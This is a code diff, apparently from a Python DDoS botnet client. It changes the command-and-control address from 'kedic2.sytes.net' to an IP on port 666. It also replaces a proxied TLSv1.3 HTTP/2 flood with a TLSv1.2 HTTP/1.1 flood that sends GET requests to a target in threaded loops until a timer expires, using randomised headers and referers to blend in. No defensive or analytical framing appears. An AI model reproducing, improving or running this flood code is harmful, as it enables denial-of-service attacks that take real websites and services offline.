@@ -7,7 +7,7 @@ from random import choice as che
 from random import randint as ran
 from random import _urandom as byt
 from certifi import where
-from ssl import CERT_NONE , create_default_context , SSLContext , PROTOCOL_TLSv1_2 , OP_NO_TLSv1 , OP_NO_TLSv1_1 , OP_NO_TLSv1_2 , TLSVersion
+from ssl import CERT_NONE , create_default_context , SSLContext , PROTOCOL_TLSv1_2
 from fake_useragent import UserAgent
 from string import ascii_letters , digits
 from struct import pack
@@ -31,7 +31,7 @@ from os import system , name , path , getpid , kill , getcwd
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
 
-ipc2 = 'kedic2.sytes.net'
+ipc2 = '198.50.160.231'
 portc2 = 666
 
 def strm(siz):
@@ -776,49 +776,30 @@ def main():
                             except:
                                 pass
                             
-                    def tlsv1_3():
+                    def tlsv1_2():
                         while time() < timer:
                             try:
                                 if url.split('://')[0] == 'https':
-                                    sok5 = open('theprxy.txt' , 'r').read().split()
-                                    s = socksocket()
-                                    s = socket.create_connection(target , port)
-                                    pri = che(sok5).split(':');
-                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                                    encrypted_data = b64encode(f"GET {path} HTTP/2\r\nHost: {target}\r\n\r\n".encode()).decode()
-                                    conn = H2Connection()
-                                    conn.initiate_connection()
-                                    ctx = create_default_context()
-                                    ctx.minimum_version = TLSVersion.TLSv1_3
-                                    ctx.maximum_version = TLSVersion.TLSv1_3
-                                    s = ctx.wrap_socket(s , server_hostname=target)
-                                    s.connect((target , port))
+                                    context = SSLContext(PROTOCOL_TLSv1_2)
+                                    with socket.create_connection((target , port)) as sock:
+                                        with context.wrap_socket(sock , server_hostname=target ) as s:
+                                            s.connect((target , port))
                                 else:
-                                    sok5 = open('theprxy.txt' , 'r').read().split()
-                                    s = socksocket()
-                                    pri = che(sok5).split(':');
-                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                                    encrypted_data = b64encode(f"GET {path} HTTP/2\r\nHost: {target}\r\n\r\n".encode()).decode()
-                                    conn = H2Connection()
-                                    conn.initiate_connection()
+                                    s = socket(AF_INET , SOCK_STREAM)
                                     s.connect((target , port))
                                 for _ in range(rpc):
                                     iur = "https" if url.split('://')[0] == "https" else "http"
-                                    payl = {
-                                        ":method": "GET",
-                                        ":path": path,
-                                        ":scheme": iur,
-                                        ":authority": target,
-                                        "user-agent": ua,
-                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                                        "accept-encoding": "gzip, deflate, br",
-                                        "connection": "keep-alive",
-                                        "encrypted-data": encrypted_data
-                                    }
-                                    conn.send_headers(1  , payl)
-                                    s.send(conn.data_to_send())
+                                    payl = (
+                                        f"GET {path} HTTP/1.1\r\n"
+                                        f"Host: {target}\r\n"
+                                        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\r\n"
+                                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+                                        f"Accept-Encoding: gzip, deflate, br\r\n"
+                                        f"Accept-Language: en-US,en;q=0.9\r\n"
+                                        f"Connection: close\r\n"
+                                        f"\r\n"
+                                    )
+                                    s.sendall(payl.encode())
                             except:
                                 pass
                                     
@@ -1219,9 +1200,9 @@ def main():
                     elif method == 'http-ir':
                         for _ in range(threads):
                             thr(target=http_ir).start()
-                    elif method == 'tlsv1.3':
+                    elif method == 'tls':
                         for _ in range(threads):
-                            thr(target=tlsv1_3).start()
+                            thr(target=tlsv1_2).start()
                     elif method == 'udp':
                         for _ in range(threads):
                             thr(target=udp).start()
